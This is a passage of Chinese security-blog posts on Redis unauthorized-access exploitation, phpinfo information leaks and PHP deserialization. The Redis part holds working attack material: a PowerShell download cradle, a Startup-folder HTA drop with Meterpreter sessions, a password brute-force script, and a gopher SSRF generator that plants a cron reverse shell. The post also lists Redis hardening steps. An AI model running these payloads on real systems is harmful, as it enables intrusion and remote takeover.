System.Net.Webclient).DownloadString(&#x27;http://119.91.129.12:8080/1.ps1&#x27;)&quot;&lt;/scRipt&gt;</span><br><span class="line">[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set a</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>hta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#msfconsole </span><br><span class="line">use payload/windows/meterpreter/reverse_tcp</span><br><span class="line">generate -t hta-psh -f /var/www/1.ps1</span><br><span class="line">#之后起个handle，略</span><br></pre></td></tr></table></figure><p>修改1.ps1，文件内容大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$command=”powershell -nop -w hidden -e xxxxxxxxxxxxxxxx”;iex $command;$command2=”taskkill /im mshta.exe”;iex $command2;</span><br></pre></td></tr></table></figure><p>最后写入文件，等待管理员登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">oot@weisuo.org:~# redis-cli -h 192.168.138.27</span><br><span class="line">redis 192.168.138.27:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;2.hta&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">redis 192.168.138.27:6379&gt;[/p][p=20, null, left]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; rexploit -j -z</span><br><span class="line">[*] Stopping existing job...</span><br><span class="line">[*] Reloading module...</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP handler on 119.91.151.22:80</span><br><span class="line">msf exploit(handler) &gt; [*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957999 bytes) to 60.111.27.14</span><br><span class="line">[*] Meterpreter session 4 opened (119.91.151.22:80 -&gt; 60.191.37.34:56301) at 2016-06-06 11:06:00 -0400</span><br><span class="line">[*] Session ID 4 (119.91.151.22:80 -&gt; 60.111.27.14:56301) processing AutoRunScript &#x27;migrate -f&#x27;</span><br><span class="line">[*] Current server process: powershell.exe (4896)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3768</span><br><span class="line">[+] Successfully migrated to process</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><strong>redis主从复制rce</strong><br>　　Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>　　在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 <a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p>　　在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p>网上收集两个比较方便的getshell python脚本</p><p>1.<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><img src="image-20210818200257389.png" alt="image-20210818200257389"></p><p>2.<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p><img src="image-20210818200323923.png" alt="image-20210818200323923"></p><p><img src="image-20210818200341465.png" alt="image-20210818200341465"></p><p>3.脚本</p><p>可用来测试是否存在未授权或弱口令的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">PASSWORD_DIC=[<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@aaw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> pass_ <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(pass_))</span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;+OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;存在弱口令，密码：%s&quot;</span> % (pass_)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> check(ip,port, timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h1 id="SSRF相关"><a href="#SSRF相关" class="headerlink" title="SSRF相关"></a>SSRF相关</h1><p><strong>ssrf，redis与gopher</strong></p><p>如果通过ssrf探测到内网某ip开启了6379端口，并存在未授权，如何结合gopher协议来写shell。</p><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p>gopher协议格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br></pre></td></tr></table></figure><p>如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码。注意%0d%0a是\r\n的URL编码。</p><p>gopher发送请求HTTP GET请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.194.1:6666/_abcd</span><br></pre></td></tr></table></figure><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去</p><p>由于gopher协议规则比较复杂，这里借助一个github的工具来生成payload：<a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p><p>只需要在redis-over-gopher/redis.cmd中写入redis执行的命令，比如下面的命令直接在web目录下写shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>编辑好后运行redis-over-gopher/redis-over-gopher.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-over-gopher.py</span><br></pre></td></tr></table></figure><p>就可以生成支持gopher协议的payload：</p><p><img src="1344396-20210102184648153-1395513140.png" alt="img"></p><p>使用curl运行payload</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184706456-696764708.png"><img src="1344396-20210102184706456-696764708.png" alt="img"></a></p><p>进入docker容器，发现shell.php已经成功生成</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184639299-51740366.png"><img src="1344396-20210102184639299-51740366.png" alt="img"></a></p><p>注：需要将内容再进行一次url编码传到web的参数中才会正常运行</p><p>使用ssrf端口探测的时候，不要拘泥于http协议，还可以使用dict协议来进行探测</p><p>利用gopher协议反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*gopher协议反弹shell利用脚本*/</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.127.140&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.127.131&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;7777&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">   <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">   <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">   <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">   <span class="string">&quot;save&quot;</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">  CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">  cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181438636-1255491191.png"><img src="1344396-20210102181438636-1255491191.png" alt="img"></a></strong></p><p>redis如果有密码，是弱口令的话，可以通过python脚本爆破，看回显来确定密码是否正确</p><p>如果有口令在最前面，和gopher的格式一样，如下健为AUTH，密码为123456</p><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181808754-1675763347.png"><img src="1344396-20210102181808754-1675763347.png" alt="img"></a></strong></p><p>爆破的时候需要在寻常的未授权前加上认证的gopher字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0D%0A</span><br></pre></td></tr></table></figure><p>爆破成功的化可以直接结合gopher协议对redis进行写shell的操作。</p><p>这里结合上面的redis主从复制的RCE来执行命令，先来构造加载exp.so的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/</span><br><span class="line">config set dbfilename /tmp/</span><br><span class="line">slaveof 192.168.127.140 4444</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;whoami&#x27;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102182908032-751922075.png"><img src="1344396-20210102182908032-751922075.png" alt="img"></a></p><p>这样就可以加载本地的exp.so对redis进行爆破，如果爆破成功就执行whoami命令。</p><p>这里只是一种演示，使用此方法同样可以写shell，写计划任务来获取shell。</p><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><h3 id="修复办法"><a href="#修复办法" class="headerlink" title="修复办法"></a>修复办法</h3><p>（1）禁止公网开放Redis端口,可以在防火墙上禁用6379 Redis的端口</p><p>（2）检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）</p><p>（3）增加 Redis 密码验证</p><p> 首先停止REDIS服务，打开redis.conf配置文件（不同的配置文件，其路径可能不同）/etc/redis/6379.conf,找到# requirepass foobared去掉前面的#号，然后将foobared改为自己设定的密码，重启启动redis服务。</p><p>（4）修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问）。</p><h3 id="可参考加固修改命令"><a href="#可参考加固修改命令" class="headerlink" title="可参考加固修改命令"></a>可参考加固修改命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>port</td><td>修改redis使用的默认端口</td></tr><tr><td>bind</td><td>设定redis监听的专用IP</td></tr><tr><td>requirepass</td><td>设定redis连接的密码</td></tr><tr><td>rename-command CONFIG “”</td><td>禁用CONFIG命令</td></tr><tr><td>rename-command info info2</td><td>重命名info为info2</td></tr></tbody></table><p>参考文章</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12230858.html">https://www.cnblogs.com/Xy--1/p/12230858.html</a></p><p><a href="http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1">http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1</a></p><p><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p><p><a href="http://www.jianshu.com/p/e550628ba1bc">http://www.jianshu.com/p/e550628ba1bc</a></p><p><a href="https://www.cnblogs.com/0daybug/p/12389138.html">https://www.cnblogs.com/0daybug/p/12389138.html</a></p><p><a href="https://www.webshell.cc/5154.html">https://www.webshell.cc/5154.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 漏洞总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo信息利用</title>
      <link href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
      <url>/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>phpinfo信息利用</p><span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h4 id="system-系统信息"><a href="#system-系统信息" class="headerlink" title="system:系统信息"></a>system:系统信息</h4><p><img src="image-20210728150900924.png" alt="image-20210728150900924"></p><h4 id="extension-dir-php扩展的路径"><a href="#extension-dir-php扩展的路径" class="headerlink" title="extension_dir:php扩展的路径"></a><strong>extension_dir:php扩展的路径</strong></h4><p><img src="image-20210728151221382.png" alt="image-20210728151221382"></p><h4 id="SERVER-‘HTTP-HOST’-网站真实IP"><a href="#SERVER-‘HTTP-HOST’-网站真实IP" class="headerlink" title="$_SERVER[‘HTTP_HOST’]:网站真实IP"></a>$_SERVER[‘HTTP_HOST’]:网站真实IP</h4><p><img src="image-20210728151415306.png" alt="image-20210728151415306"></p><h3 id="有关目录的"><a href="#有关目录的" class="headerlink" title="有关目录的"></a>有关目录的</h3><h4 id="SERVER-‘DOCUMENT-ROOT’-web根目录"><a href="#SERVER-‘DOCUMENT-ROOT’-web根目录" class="headerlink" title="$_SERVER[‘DOCUMENT_ROOT’]:web根目录"></a>$_SERVER[‘DOCUMENT_ROOT’]:web根目录</h4><p><img src="image-20210728151507429.png" alt="image-20210728151507429"></p><h4 id="SERVER-‘SCRIPT-FILENAME’-index-php根目录"><a href="#SERVER-‘SCRIPT-FILENAME’-index-php根目录" class="headerlink" title="**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录"></a>**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录</h4><p><img src="image-20210803151453564.png" alt="image-20210803151453564"></p><h4 id="SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录"><a href="#SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录" class="headerlink" title="**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录"></a>**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录</h4><p><img src="image-20210803151510199.png" alt="image-20210803151510199"></p><h4 id="session-save-path-session的存储路径"><a href="#session-save-path-session的存储路径" class="headerlink" title="session.save_path   session的存储路径"></a><strong>session.save_path</strong>   session的存储路径</h4><p><img src="image-20210803151800423.png" alt="image-20210803151800423"></p><h4 id="APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径"><a href="#APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径" class="headerlink" title="APACHE_RUN_DIR  和 APACHE_PID_FILE   APACHE的路径"></a><strong>APACHE_RUN_DIR</strong>  和 <strong>APACHE_PID_FILE</strong>   APACHE的路径</h4><p><img src="image-20210803152631954.png" alt="image-20210803152631954"></p><p><img src="image-20210803152913592.png" alt="image-20210803152913592"></p><p><img src="image-20210803152937985.png" alt="image-20210803152937985"></p><p><img src="image-20210803153211410.png" alt="image-20210803153211410"></p><h4 id="pdo-mysql-default-socket"><a href="#pdo-mysql-default-socket" class="headerlink" title="pdo_mysql.default_socket"></a><strong>pdo_mysql.default_socket</strong></h4><p><img src="image-20210803153014374.png" alt="image-20210803153014374"></p><h4 id="临时文件目录"><a href="#临时文件目录" class="headerlink" title="临时文件目录"></a>临时文件目录</h4><p><img src="image-20210728151841301.png" alt="image-20210728151841301"></p><p>phpinfo()页面post一个shell，可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了</p><h1 id="重要配置"><a href="#重要配置" class="headerlink" title="重要配置"></a>重要配置</h1><h4 id="allow-url-include-远程文件包含"><a href="#allow-url-include-远程文件包含" class="headerlink" title="allow_url_include:远程文件包含"></a>allow_url_include:远程文件包含</h4><p><img src="image-20210728152037075.png" alt="image-20210728152037075"></p><h4 id="disable-functions-表示禁用的函数"><a href="#disable-functions-表示禁用的函数" class="headerlink" title="disable_functions:表示禁用的函数"></a>disable_functions:表示禁用的函数</h4><p><img src="image-20210728152223602.png" alt="image-20210728152223602"></p><p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><h4 id="asp-tags-php标签-php7以下版本有"><a href="#asp-tags-php标签-php7以下版本有" class="headerlink" title="asp_tags:php标签(php7以下版本有)"></a><strong>asp_tags:php标签</strong>(php7以下版本有)</h4><p><img src="image-20210728152325831.png" alt="image-20210728152325831"></p><p>有4种形式如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的</p><p><img src="image-20210728152402171.png" alt="image-20210728152402171"></p><h4 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a><strong>short_open_tag</strong></h4><p><img src="image-20210728152440576.png" alt="image-20210728152440576"></p><p>允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc:"></a>magic_quotes_gpc:</h4><p><img src="image-20210728153125839.png" alt="image-20210728153125839"></p><p>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御</p><p>php5.4以下版本有的函数，默认开启，会对特殊字符进行转yi</p><blockquote><p>参考</p><p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞总结</title>
      <link href="/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理<br>序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方<br>反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值<br>二者结合可以轻松存储数据 使程序更具维护性</p><span id="more"></span><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h1 id="serialize函数"><a href="#serialize函数" class="headerlink" title="serialize函数"></a>serialize函数</h1><p>是序列化函数，序列化对象时 PHP在序列化动作之前调用成员函数__sleep 这样就允许对象在被序列化之前做任何清除操作。<br><strong>类型字母详解:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure><p>boolean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b:;</span><br><span class="line">b:1; // True</span><br><span class="line">b:0; // False</span><br></pre></td></tr></table></figure><p>integer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i:;</span><br><span class="line">i:1; // 1</span><br><span class="line">i:-3; // -3</span><br></pre></td></tr></table></figure><p>double</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:;</span><br><span class="line">d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）</span><br></pre></td></tr></table></figure><p>NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N; //NULL</span><br></pre></td></tr></table></figure><p>string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s::&quot;&quot;;</span><br><span class="line">s&quot;PALEONEC&quot;; // &quot;PALEONEC&quot;</span><br></pre></td></tr></table></figure><p>array</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a::&#123;key, value pairs&#125;;</span><br><span class="line">a&#123;s&quot;key1&quot;;s&quot;value1&quot;;s&quot;value2&quot;;&#125; // array(&quot;key1&quot; =&gt; &quot;value1&quot;, &quot;key2&quot; =&gt; &quot;value2&quot;)</span><br></pre></td></tr></table></figure><p>类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;</span><br><span class="line">类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</span><br></pre></td></tr></table></figure><p>注：对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。<br>所以在传入序列化字符串的时候，需要补齐这些空字节。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span 